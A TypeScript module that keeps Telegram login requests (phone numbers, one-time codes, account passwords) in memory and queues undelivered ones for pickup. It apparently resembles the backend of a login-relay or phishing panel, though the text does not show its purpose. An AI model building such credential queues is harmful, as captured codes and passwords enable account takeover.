// In-memory storage for Telegram authentication requests
// In production, consider using Redis or a database

interface RequestData {
  requestId: string
  chatId: string
  action: string
  phone?: string | null
  code?: string | null
  password?: string | null
  country?: string | null
  timestamp: string
  processed: boolean
  status: string
  message?: string
  lastUpdated?: string
  delivered?: boolean
}

class MemoryStorage {
  private requests: Map<string, RequestData> = new Map()
  private requestCounter = 0

  saveRequest(data: Omit<RequestData, "requestId">): string {
    this.requestCounter++
    const requestId = `req_${Date.now()}_${this.requestCounter}`

    const requestData: RequestData = {
      requestId,
      ...data,
      delivered: false,
    }

    this.requests.set(requestId, requestData)

    // Auto-cleanup old requests after 5 minutes
    setTimeout(
      () => {
        if (this.requests.get(requestId)?.processed) {
          this.requests.delete(requestId)
        }
      },
      5 * 60 * 1000,
    )

    return requestId
  }

  getRequest(requestId: string): RequestData | undefined {
    return this.requests.get(requestId)
  }

  getPendingRequests(): RequestData[] {
    return Array.from(this.requests.values()).filter((req) => !req.processed && !req.delivered)
  }

  updateRequest(requestId: string, updates: Partial<RequestData>): boolean {
    const request = this.requests.get(requestId)
    if (!request) return false

    this.requests.set(requestId, {
      ...request,
      ...updates,
    })

    return true
  }

  markAsDelivered(requestId: string): boolean {
    return this.updateRequest(requestId, { delivered: true })
  }

  // For debugging
  getAllRequests(): RequestData[] {
    return Array.from(this.requests.values())
  }

  clearAll(): void {
    this.requests.clear()
    this.requestCounter = 0
  }
}

// Singleton instance
export const storage = new MemoryStorage()
